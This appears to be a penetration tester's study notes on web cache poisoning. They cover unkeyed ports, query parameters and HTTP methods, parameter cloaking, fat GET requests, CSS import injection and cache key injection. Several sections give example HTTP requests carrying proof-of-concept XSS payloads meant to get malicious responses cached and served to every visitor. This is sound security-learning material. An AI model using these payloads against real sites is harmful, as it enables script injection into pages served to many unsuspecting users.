# Content 
- [How Cache poisoning happen](#how-cache-poisoning-happen)
- [Methdology](#methdology)
- [Exploiting cache implementation flaws](#exploiting-cache-implementation-flaws)
  - [Unkeyed port](#unkeyed-port)
  - [Unkeyed query string](#unkeyed-query-string)
  - [Unkeyed query parameters](#unkeyed-query-parameters)
  - [Unkeyed cookie - Unkeyed Header](#unkeyed-cookie---unkeyed-header)
  - [Unkeyed HTTP method](#unkeyed-http-method)
  - [Cache parameter cloaking](#cache-parameter-cloaking)
  - [Exploiting fat GET support](#exploiting-fat-get-support)
  - [Exploiting dynamic content in resource imports](#exploiting-dynamic-content-in-resource-imports)
  - [Normalized cache keys](#normalized-cache-keys)
  - [Cache key injection](#cache-key-injection)




## How Cache poisoning happen 
- Content is cached based on Cache keys (paramters , headers , cookies) if it is exist it will be cached 
- if a (parameter , header , cookies ) can introduce a malicious behavior and still be cached (this named unkeyd) so the attack happen


## Methdology 
- Identify and evaluate unkeyed inputs
- Elicit a harmful response from the back-end server
- Get the response cached




![Screenshot 2023-10-16 at 22-06-02 Web Cache Poisoning](https://github.com/kiro6/penetration-testing-notes/assets/57776872/5fabaccf-958a-4f7f-8f67-1a96904a359a)





Headers to Consider
--------------------
- [Cache-control directives](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control#directives)
- Vary header 
- 3rd parties headers 
- analytical headers
- CDN cache headers

| CDN                   | URL                                           |
|-------------------------|-----------------------------------------------|
| Akamai Pragma headers   | [https://techdocs.akamai.com/edge-diagnostics/docs/pragma-headers](https://techdocs.akamai.com/edge-diagnostics/docs/pragma-headers) |



# Exploiting cache implementation flaws 



## Unkeyed port

EX :
- consider the case where a redirect URL was dynamically generated based on the Host header
- This might enable you to construct a denial-of-service attack by simply adding an arbitrary port to the request. Every user will be redirected to this port

```http

GET / HTTP/1.1
Host: VulnWebSite.com:port   (port is unkeyed)


HTTP/1.1 200 OK
X-Cache: hit 

```

EX: 
- if the host header is reflected and can input a non numeric port maybe can introduce xss




## Unkeyed query string

how to find : 
- that you can still get a cache hit even if you change the query parameters
- if it doesn't show you if there is a cache hit or no observe how can this paramter effect the page if it is dynamic by doing this things: 

add a keyd header as a chache buster
```http
GET /?input=payload  HTTP/1.1
Cookie: cachebuster=1
```
see whether there are any discrepancies between how the cache and the back-end normalize the path of the request.



the following entries might all be cached separately but treated as equivalent to` GET /` on the back-end :

```ini

GET ///
GET /./
GET /notexist/../

Apache: GET //
Nginx : GET /%2F
PHP   : GET /index.php/xyz
.NET  : GET /(A(xyz)/

...etc
              

```



EX: self xss to stored via cache poisoning 

```http

GET ///?evil='/><script>alert(1)</script>     ## observe that the value of the paramter doo not reflect in page until you tamper the path , that mean the query is not keyed


GET /?evil='/><script>alert(1)</script>       ## serve the payload to the main path

```



## Unkeyed query parameters

- some websites only exclude specific query parameters that are not relevant to the back-end application
- such as parameters for analytics or serving targeted advertisements. UTM parameters like `utm_content`
- so if you found a unkeyd paramter that have malicious behaviour you can cache it
- test it using param miner


EX:
```http
GET /?utm_content='/><script>alert(1)</script>   ## every user will visit / will have a reflected xss cached 
```



## Unkeyed cookie - Unkeyed Header 

EX : 
- maybe you can cache a sentstive content require some privilege stored as a session cookie 
- if the cookie is not keyed so it is accessible by anyone


## Unkeyed HTTP method
- the HTTP method may not be keyed.
- This might allow you to poison the cache with a POST request containing a malicious payload in the body.
- Your payload would then even be served in response to users' GET requests.

## Cache parameter cloaking

### What is Cache parameter cloaking
 
- If you can work out how the cache parses the URL to identify and remove the unwanted (harmless) parameters
- This can potentially allow you to sneak arbitrary parameters into the application logic by "cloaking" them in an excluded (unkeyed) parameter. 

**EX :**

- some poorly written parsing algorithms may incorrectly treat any `?` as the start of a new parameter, irrespective of its position.
- lets consider the cache server behaves in this way but the server is not
```ini
GET /?example=123?excluded_param=bad-stuff-here
```
**Cache Server** see 2 paramters : 
- `example` = `123`
- `excluded_param` = `bad-stuff-here`

**Backend Server** see 1 parameter 
- `example` = `123?excluded_param=bad-stuff-here`

### Exploiting parameter parsing quirks
EX: 
- The Ruby on Rails framework,interprets both `&` and  `;` as delimiters.
- When used in conjunction with a cache that does not support this, you can potentially exploit another quirk to override the value of a keyed parameter in the application logic.
```ini
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
```
**Cache Server** see 2 paramters :
- `keyed_param` = `abc`
- `excluded_param` = `123;keyed_param=bad-stuff-here`

**Backend Server** see 3 parameters 
- `keyed_param`    = `abc`
- `excluded_param` = `123`
- `keyed_param`    = `bad-stuff-here`

while Ruby on Rails gives precedence to the final parameter value occurrence , now we have cached the parameter with the malicious value 



## Exploiting fat GET support


- Although this scenario is pretty rare, you can sometimes achieve a similar effect to [Unkeyed HTTP method](#unkeyed-http-method) by simply adding a body to a GET request to create a `fat` GET request:

EX :
```http
GET /?param=innocent HTTP/1.1
 …
 param=bad-stuff-here
```

You can sometimes encourage "fat GET" handling by overriding the HTTP method
```http
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```

## Exploiting dynamic content in resource imports


EX : 
- consider a page that reflects a query string in an import statement
- You could exploit this behavior to inject malicious CSS that exfiltrates sensitive information from any pages that import /style.css
request
```
GET /style.css?excluded_param=123);@import… 
```
response
```http
HTTP/1.1 HTTP/1.1 200 OK … 
@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…
```
 

- If the page importing the CSS file doesn't specify a `doctype`, you can maybe even exploit static CSS files.
- Given the right configuration, browsers will simply scour the document looking for CSS and then execute it.
- This means that you can occasionally poison static CSS files by triggering a server error that reflects the excluded query parameter

request
```
GET /style.css?excluded_param=alert(1)%0A{}*{color:red;}
```
response
```
HTTP/1.1 HTTP/1.1 200 OK Content-Type: text/html …
This request was blocked due to…alert(1){}*{color:red;}
```


## Normalized cache keys

-Some caching implementations normalize keyed input when adding it to the cache key.
-In this case, both of the following requests would have the same key:

```http
GET /example?param="><test>
```
```http
GET /example?param=%22%3e%3ctest%3e
```

- This behavior can allow you to exploit these otherwise "unexploitable" XSS vulnerabilities.


## Cache key injection
- Keyed components are often bundled together in a string to create the cache key.
- If the cache doesn't implement proper escaping of the delimiters between the components
- so you can potentially exploit this behavior to craft two different requests that have the same cache key.

EX : 
The following example uses double-underscores to delimit different components in the cache key and does not escape them.



Expolit Request : 
```http
GET /path?param=123 HTTP/1.1
Origin: '-alert(1)-'__
```
Expolit Response : 
```http
HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__

<script>…'-alert(1)-'…</script>
```

Victim Request :
```http
GET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1
```
Victim Response : 
```http
HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__
X-Cache: hit

<script>…'-alert(1)-'…</script>
```

## Internal cache poisoning





- if the website unsafely uses unkeyed headers to import files, this can potentially be exploited by an attacker to import a malicious file instead. However, this applies to more than just JavaScript files.
- Many websites use JavaScript to fetch and process additional data from the back-end.
- If a script handles data from the server in an unsafe way, this can potentially lead to all kinds of DOM-based vulnerabilities.

